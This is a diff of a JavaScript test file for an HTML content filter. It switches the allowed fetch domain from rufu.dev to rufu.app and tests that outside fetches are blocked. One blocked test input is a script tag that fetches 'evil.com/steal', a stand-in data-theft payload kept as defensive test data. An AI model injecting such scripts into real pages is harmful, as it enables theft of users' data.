@@ -78,10 +78,10 @@ describe('[フィルター] 通過すべき境界値ケース', () => {
     expect(checkContent('<p>animation demo</p>')).toEqual({ ok: true });
   });
 
-  it('rufu.dev ドメインへの fetch は通過', () => {
+  it('rufu.app ドメインへの fetch は通過', () => {
     const cases = [
-      "<script>fetch('https://rufu.dev/api/likes', { method: 'POST' })</script>",
-      '<script>fetch("https://rufu.dev/api/comments")</script>',
+      "<script>fetch('https://rufu.app/api/likes', { method: 'POST' })</script>",
+      '<script>fetch("https://rufu.app/api/comments")</script>',
     ];
     cases.forEach((html) => expect(checkContent(html)).toEqual({ ok: true }));
   });
@@ -164,7 +164,7 @@ describe('[フィルター] ブロックすべき境界値ケース', () => {
     });
   });
 
-  it('rufu.dev 以外の外部 fetch はブロック', () => {
+  it('rufu.app 以外の外部 fetch はブロック', () => {
     const cases = [
       "<script>fetch('https://evil.com/steal')</script>",
       '<script>fetch("https://api.example.com/data")</script>',
